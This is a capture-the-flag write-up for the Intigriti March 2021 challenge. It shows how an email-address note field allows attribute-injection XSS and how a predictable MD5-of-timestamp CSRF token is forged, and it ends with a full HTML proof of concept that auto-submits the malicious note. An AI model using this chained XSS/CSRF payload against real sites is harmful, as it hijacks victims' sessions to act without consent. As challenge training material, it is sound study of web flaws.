# Intigriti 0321 Challenge Writeup

First of all , how the website work is the website has notes that take input. Our input has generated to the `<p>` tag. I have entered html tags like `<script> , <h1>,` etc..
and it encoded all the html tags.  
  When I entered the notes as `https://google.com` , the response come with `<a>` tag. I tried to escape from the `<a>` tag and still it 
didn't work.  
  Then , I tried with `mgthura@test.com` it converted to `<a>` tag again.  
  ![](https://github.com/mgthuramoemyint/mgthura/blob/gh-pages/intigrit.PNG?raw=true)
  I tested to break out the `<a>` tag again with the payload `"mgthura"@test.com`.  
  The response
come with `<a href="mailto:" mgthura"@test.com"="">"mgthura"@test.com</a>` showing that  we've successfully injected to the tag. Still we can't use to escape from the `<a>` tag
just adding some event so the new payload will be `"onmouseenter=alert('flag{THIS_IS_THE_FLAG}');"@test.com`  
  By entering the new payload,
  ![](https://github.com/mgthuramoemyint/mgthura/blob/gh-pages/intigrit2.PNG?raw=true)
  It was still a self xss. The challenge said it can't be self xss.
  So we need to chain csrf to get a stored xss. I checked the csrf token and anaylsing which hash it is , seem to be md5 hash.
  Look at the first photo again, see what it is written with comment tag.  
  `<!-- page generated at 2021-03-29 12:38:35 -->`  
  By changing the time to timestamp , I got the digits `1617020646` and encrypting to md5.  
  ![](https://github.com/mgthuramoemyint/mgthura/blob/gh-pages/md5.PNG?raw=true)  
  Hence , we now how to bypass CSRF it's time to make a POC.  
    
  The csrf works liken when you open the page it will generate a token and you need to make a request with that generated token. So we've to open a new page in POC or by using iframe.
  ```<html>
  <html>
<body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.18.0/js/md5.min.js" integrity="sha512-Hmp6qDy9imQmd15Ds1WQJ3uoyGCUz5myyr5ijainC1z+tP7wuXcze5ZZR3dF7+rkRALfNy7jcfgS5hH8wJ/2dQ==" crossorigin="anonymous"></script>
<script>
function go(){
let w = window.open("https://challenge-0321.intigriti.io/",'');
setTimeout(function(){w.close();trigger();csrf.submit()},1000)
}
</script>

<h1 onclick=go()>Click me</h1>
<form name=csrf style="display:none" action="https://challenge-0321.intigriti.io/" method="POST">
<input id="csrfToken" type="hidden" name="csrf" value="" />
<input type="hidden" name="notes" value="&quot;onmouseenter=alert(&#39;flag{THIS_IS_THE_FLAG}&#39;);&quot;@test.com" />
<input type="submit" onclick="trigger()" value="Submit request" />
</form>
<script>

var d2 = Date.now();
console.log(d2);
let csrftoken = document.getElementById("csrfToken");

let trigger = () => {
let date = Date.now();
date = Math.floor(date / 1000)
hash = md5(date);
csrftoken.value = hash
console.log(date);
}
</script>
</body>

</html>
```
## Explantation of POC
First , I called a javascript that will encrypt the value to md5
`https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.18.0/js/md5.min.js`.  
The another script tag is opening a new window and submitting the request. The form is CSRF request , the last script is I take current timestamp with `Date.now()`.  
The timestamp includes millisecond and don't need it so removed by dividing 1000 for the decimal value I used Math.floor to remove that.
Now encrypt it with md5 , finally we got the csrf value.
Still the script is right but sometime it late a second when we hash the value. I asked  help from my friend to become a better script.  
You have to allow pop-up to use this script. https://raw.githubusercontent.com/mgthuramoemyint/mgthura/gh-pages/final.html
![](https://github.com/mgthuramoemyint/mgthura/blob/gh-pages/2021-03-29%2020-07-56.gif?raw=true)
